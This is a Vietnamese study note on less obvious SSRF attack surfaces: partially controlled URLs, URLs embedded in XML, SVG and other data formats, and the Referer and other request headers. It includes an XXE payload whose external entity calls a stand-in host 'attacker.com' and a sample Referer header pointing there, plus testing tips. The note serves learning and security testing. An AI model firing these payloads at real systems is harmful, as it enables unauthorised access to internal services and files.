# 🔍 Bề mặt tấn công ẩn cho SSRF – Note ôn tập

Không phải ==lúc nào ứng dụng cũng nhận URL đầy đủ==. SSRF có thể ẩn trong những vị trí tinh vi hơn.

---
#ssrf 
## 1. URL một phần (Partial URLs)
- Ứng dụng ==chỉ nhận **hostname** hoặc **một phần path**== (VD: `/api/...`), rồi tự ghép thành URL hoàn chỉnh.
- Bạn ==**không kiểm soát toàn bộ URL**, chỉ thay đổi phần được chèn.==
- Khả năng khai thác bị giới hạn (không đổi được scheme, phần đầu path), nhưng vẫn có thể:
  - Chỉ định host nội bộ nếu không bị filter.
  - Thêm path traversal, query string… để thay đổi hành vi request.
- **Phát hiện**: Quan sát request có tham số chứa hostname, IP, hoặc path rõ ràng.

---

## 2. URL nằm trong định dạng dữ liệu (Data Formats)
- Dữ liệu gửi lên server dưới dạng có cấu trúc (XML, JSON, YAML…) có thể chứa URL và được parser tự động xử lý.
- **Ví dụ điển hình: XML (XXE)**:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/ssrf"> ]>
  <data>&xxe;</data>
  ```
  - Parser tải tài nguyên từ URL do attacker cung cấp → SSRF.
  - XXE cũng có thể dẫn đến đọc file nội bộ, RCE, DoS...
- Các định dạng khác: SVG (tải ảnh ngoài), PDF forms, Office Open XML...

---

## 3. SSRF qua header `Referer` (và các header khác)
- Một số phần mềm phân tích/phân tích liên kết **tự động truy cập URL** trong header `Referer` để thu thập thông tin trang giới thiệu (anchor text, context...).
- Attacker có thể kiểm soát giá trị `Referer` bằng cách:
  - Gửi request từ trang của mình (với header `Referer: http://attacker.com/evil`).
  - Hoặc chèn link tới ứng dụng mục tiêu từ trang attacker.
- Nếu backend gửi request đến URL trong `Referer`, đó chính là một vector SSRF.
- Các header khác cũng có thể bị lợi dụng tương tự: `Origin`, `X-Forwarded-For`, `X-Forwarded-Host`…

---

## 📌 Mẹo phát hiện nhanh
- **Partial URL**: Tập trung vào tham số chứa địa chỉ IP, host, đường dẫn.
- **Data format**: Gửi payload XXE/SVG đến các endpoint nhận XML/upload file.
- **Header-based SSRF**: Dùng Burp Collaborator thay đổi `Referer` thành domain của bạn, xem có callback không.

✍️ **Ghi nhớ**: SSRF không chỉ ở những ô nhập URL rõ ràng. Luôn kiểm tra mọi nơi mà dữ liệu bạn kiểm soát có thể được dùng để tạo request phía server.